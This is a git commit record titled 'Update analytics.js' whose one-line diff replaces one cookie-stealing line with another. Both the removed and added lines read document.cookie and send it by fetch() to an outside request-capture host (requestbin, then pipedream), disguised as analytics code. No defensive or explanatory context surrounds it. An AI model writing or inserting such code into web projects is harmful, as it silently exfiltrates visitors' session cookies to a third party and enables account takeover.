26726750feeecf0d035af494eed5a76b887d1b9b
Sohum Shah <107238828+sohumshah2@users.noreply.github.com>
2024-04-19 21:38:19 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-const cookie = document.cookie; fetch(`https://public.requestbin.com/r/en2f89uml7uqh?cookie=${encodeURIComponent(cookie)}`);
+const cookie = document.cookie; fetch(`https://en2f89uml7uqh.x.pipedream.net?cookie=${encodeURIComponent(cookie)}`);
